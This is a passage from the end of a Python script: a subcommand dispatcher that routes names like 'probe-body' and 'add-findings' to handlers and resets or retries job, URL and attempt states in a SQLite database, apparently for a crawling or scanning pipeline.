        "discovery-pending": cmd_discovery_pending, "meta-set": cmd_meta_set, "promote-jobs": cmd_promote_jobs, "promote-urls": cmd_promote_urls,
        "export-confirmed": cmd_export_confirmed,
    }
    rc_cmds = {
        "commit-batch": cmd_commit_batch, "path-commit": cmd_path_commit,
        "body-commit": cmd_body_commit, "add-findings": cmd_add_findings,
        "verify-batch": cmd_verify_batch, "verify-commit": cmd_verify_commit, "probe-body": cmd_probe_body,
        "form-plan": cmd_form_plan, "json-plan": cmd_json_plan,
    }
    if cmd in plain:
        plain[cmd](*args)
        return 0
    if cmd in rc_cmds:
        return rc_cmds[cmd](*args)
    if cmd == "reset":
        c = connect(args[0]); ensure(c)
        c.execute("BEGIN IMMEDIATE")
        u = c.execute("UPDATE urls SET state='pending' WHERE state='inflight'")
        j = c.execute("UPDATE jobs SET state='pending' WHERE state='running'")
        a = c.execute("UPDATE attempts SET state='pending' WHERE state='running'")
        c.execute("COMMIT")
        print("[*] reset: %d url(s), %d job(s), %d attempt(s)"
              % (u.rowcount, j.rowcount, a.rowcount), file=sys.stderr)
        return 0
    if cmd == "abort-batch":
        _mark_urls(args[0], args[1], "failed", bump=True)
        return 0
    if cmd == "retry":
        c = connect(args[0]); ensure(c)
        c.execute("BEGIN IMMEDIATE")
        u = c.execute("UPDATE urls SET state='pending' WHERE state='failed'")
        j = c.execute("UPDATE jobs SET state='pending' WHERE state='failed'")
        a = c.execute("UPDATE attempts SET state='pending' WHERE state IN ('running','error')")
        c.execute("COMMIT")
        print("[*] retry: %d url(s), %d job(s), %d attempt(s)"
              % (u.rowcount, j.rowcount, a.rowcount), file=sys.stderr)
        return 0
    print("unknown subcommand: %s" % cmd, file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv))
